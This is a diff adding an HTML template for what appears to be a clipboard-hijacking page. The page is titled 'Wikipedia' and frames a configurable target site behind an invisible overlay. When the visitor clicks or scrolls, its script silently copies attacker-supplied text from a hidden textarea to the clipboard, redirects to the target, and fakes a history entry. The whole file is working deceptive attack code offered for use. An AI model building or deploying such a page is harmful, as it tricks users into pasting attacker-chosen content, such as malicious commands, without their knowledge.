@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<!--[if lt IE 7]>      <html class="no-js lt-ie9 lt-ie8 lt-ie7"> <![endif]-->
+<!--[if IE 7]>         <html class="no-js lt-ie9 lt-ie8"> <![endif]-->
+<!--[if IE 8]>         <html class="no-js lt-ie9"> <![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js"> <!--<![endif]-->
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Wikipedia</title>
+    <meta name="description" content="">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="stylesheet" href="">
+    <style>
+        body,html {
+            margin:0;
+            overflow: hidden;
+        }
+        iframe {
+            width: 100vw;
+            height: 100vh;
+            border: none;
+            margin: 0;
+        }
+        #top {
+            position: fixed;
+            width: 100vw;
+            height: 100vh;
+            opacity: 0.3;
+        }
+        .hide {
+            display: none;
+        }
+        textarea {
+            position: fixed;
+            color: white;
+            border: none;
+            z-index: -2;
+            opacity: 0.1;
+        }
+    </style>
+</head>
+<body onscroll="copy()">
+<textarea onscroll="copy()" id="input" cols="30" rows="10"><%= name %></textarea>
+<div id="top"></div>
+
+<iframe src="<%= target %>"></iframe>
+<script>
+    var name = "<%= name %>";
+    var target = "<%= target %>";
+    function copy() {
+        var copyText = document.querySelector("#input");
+        copyText.select();
+        document.execCommand("copy");
+        document.querySelector("#top").classList.add('hide')
+        window.location.replace("<%= target %>");
+        window.history.pushState('page2', 'Title', '/page2.php')
+    }
+    document.querySelector("#top").addEventListener("click", copy);
+    console.log(name);
+</script>
+</body>
+</html>
